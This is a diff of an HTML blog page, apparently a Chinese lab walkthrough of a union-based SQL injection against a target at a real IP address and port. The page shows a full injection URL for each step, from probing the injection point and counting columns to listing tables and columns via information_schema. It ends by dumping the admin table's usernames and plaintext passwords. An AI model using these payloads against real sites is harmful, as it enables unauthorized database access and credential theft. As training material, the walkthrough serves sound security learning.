@@ -177,45 +177,36 @@
   <div class="article-content">
     
       <h1 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h1><ul>
-<li>当输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=1">http://59.63.200.79:8003/?id=1%20and%201=1</a><br>时网站显示正常</li>
-<li>当输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2">http://59.63.200.79:8003/?id=1%20and%201=2</a><br>时网站显示不正常，判断注入点在此。</li>
+<li>当输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=1</a><br>时网站显示正常</li>
+<li>当输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2</a><br>时网站显示不正常，判断注入点在此。</li>
 </ul>
 <h1 id="确定网站的回传的字段数"><a href="#确定网站的回传的字段数" class="headerlink" title="确定网站的回传的字段数"></a>确定网站的回传的字段数</h1><ul>
-<li>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201">http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201</a><br>网站显示正常，结尾用order by 2 时仍显示正常，当使用order by 3 时页面显示不正常，判断网站包含两个字段。</li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201</a><br>网站显示正常，结尾用order by 2 时仍显示正常，当使用order by 3 时页面显示不正常，判断网站包含两个字段。</li>
 </ul>
 <h1 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h1><ul>
-<li>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2</a><br>时页面显示出来2，确定了回显地点。</li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2</a><br>时页面显示出来2，确定了回显地点。</li>
 </ul>
 <h1 id="确定数据库名称"><a href="#确定数据库名称" class="headerlink" title="确定数据库名称"></a>确定数据库名称</h1><ul>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()</a><br>出现当前数据库的名称：maoshe</p>
+<li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()</a><br>出现当前数据库的名称：maoshe</p>
 <h1 id="确定当前数据库包含的表"><a href="#确定当前数据库包含的表" class="headerlink" title="确定当前数据库包含的表"></a>确定当前数据库包含的表</h1></li>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1</a><br>返回当前数据库包含的第一个表名：admin。</p>
+<li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1</a><br>返回当前数据库包含的第一个表名：admin。</p>
 </li>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1</a><br>页面异常，表示当前数据库只包含一个表。</p>
-</li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1</a><br>页面异常，表示当前数据库只包含一个表。</li>
 </ul>
 <p><strong><em>limit用法</em></strong></p>
 <ul>
-<li><p>LIMIT后的第一个参数是输出记录的初始位置，第二个参数偏移量，偏移多少，输出的条目就是多少。</p>
-<h1 id="确定当前数据库表包含的列名"><a href="#确定当前数据库表包含的列名" class="headerlink" title="确定当前数据库表包含的列名"></a>确定当前数据库表包含的列名</h1></li>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1</a><br>得到第一列的名称为：Id</p>
-</li>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%25">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%</a><br>20and%20table_name=%27admin%27%20limit%201,1<br>得到第二列的名称为：username </p>
-</li>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1</a><br>得到第三列的名称为：password </p>
-</li>
-<li><p>输入limit 3,1时页面异常，说明admin表只包含三列。</p>
-<h1 id="确定当前表记录的用户"><a href="#确定当前表记录的用户" class="headerlink" title="确定当前表记录的用户"></a>确定当前表记录的用户</h1></li>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1</a><br>得到第一个用户为admin</p>
-</li>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1</a><br>得到第二个用户为：ppt领取微信 。</p>
-</li>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1</a><br>页面异常，说明只包含两个用户。</p>
+<li>LIMIT后的第一个参数是输出记录的初始位置，第二个参数偏移量，偏移多少，输出的条目就是多少。<h1 id="确定当前数据库表包含的列名"><a href="#确定当前数据库表包含的列名" class="headerlink" title="确定当前数据库表包含的列名"></a>确定当前数据库表包含的列名</h1></li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1</a><br>得到第一列的名称为：Id</li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%</a><br>20and%20table_name=%27admin%27%20limit%201,1<br>得到第二列的名称为：username </li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1</a><br>得到第三列的名称为：password </li>
+<li>输入limit 3,1时页面异常，说明admin表只包含三列。<h1 id="确定当前表记录的用户"><a href="#确定当前表记录的用户" class="headerlink" title="确定当前表记录的用户"></a>确定当前表记录的用户</h1></li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1</a><br>得到第一个用户为admin</li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1</a><br>得到第二个用户为：ppt领取微信 。</li>
+<li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1</a><br>页面异常，说明只包含两个用户。</p>
 <h1 id="确定用户的密码"><a href="#确定用户的密码" class="headerlink" title="确定用户的密码"></a>确定用户的密码</h1></li>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1</a><br>得到admin用户的密码为：hellohack </p>
+<li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1</a><br>得到admin用户的密码为：hellohack </p>
 </li>
-<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1</a><br>得到第二个用户的密码为：zkaqbanban </p>
-</li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1</a><br>得到第二个用户的密码为：zkaqbanban </li>
 </ul>
 
     
@@ -250,7 +241,7 @@
     <a class="show pull-left" href="/2019/11/24/linux%E6%8C%82%E8%BD%BDU%E7%9B%98%E5%A4%B1%E8%B4%A5/">
         <i class="icon icon-angle-left"></i>
     </a>
-    <a class="show pull-right" href="/2021/03/14/%E5%AD%97%E7%AC%A6%E5%9E%8Bsql%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">
+    <a class="show pull-right" href="/2021/03/14/Hadoop-%E7%AC%94%E8%AE%B0/">
         <i class="icon icon-angle-right"></i>
     </a>
   </div>
